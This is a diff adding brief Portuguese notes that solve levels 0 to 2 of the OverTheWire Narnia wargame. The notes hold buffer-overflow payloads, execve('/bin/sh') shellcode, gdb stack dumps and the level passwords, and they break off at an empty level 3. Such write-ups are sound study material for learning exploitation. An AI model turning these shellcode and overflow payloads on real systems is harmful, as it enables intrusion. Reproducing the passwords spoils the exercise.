@@ -1,0 +1,48 @@
+ssh narnia0@narnia.labs.overthewire.org -p 2226
+
+Level0: (python -c 'print "B"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
+OBS: cat serve para o shell não ser fechado automaticamente
+
+$ cat /etc/narnia_pass/narnia1
+efeidiedae
+
+Level1: Para resolver, basta inserir um shellcode na variável EGG 
+export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+$ cat /etc/narnia_pass/narnia2
+nairiepecu
+
+Level2: Podemos ver que o buffer tem 128 bytes, logo precisamos testar enviar mais do que 128
+para causar um buffer overflow. Ao enviar 144 bytes, vemos que EIP é modificado, logo 
+precisamos de 140 bytes de NOP sled + shellcode e 4 bytes com um endereço situado no NOP
+sled. Usando um shellcode cujo tamanho é 25 bytes, devemos ter 115 bytes de instruções NOP.
+
+$ (gdb) r $(python -c 'print "\x90" * 116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
+\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x43"*4 ')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+
+(gdb) x/250x $esp
+0xffffd800:	0x1c46e8b8	0xda08b3b0	0x69587284	0x00363836
+0xffffd810:	0x72616e2f	0x2f61696e	0x6e72616e	0x00326169
+0xffffd820:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd830:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd840:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd850:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd860:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd870:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd880:	0x90909090	0x90909090	0x90909090	0x90909090
+
+Escolhendo um endereço dentro do NOP sled, como por exemplo 0xffffd860, colocamos no lugar
+da string de B's para dar override no return address.
+
+$ /narnia/narnia2 $(python -c 'print "\x90" * 116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f
+\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x60\xd8\xff\xff" ')
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+
+Level3: 
+
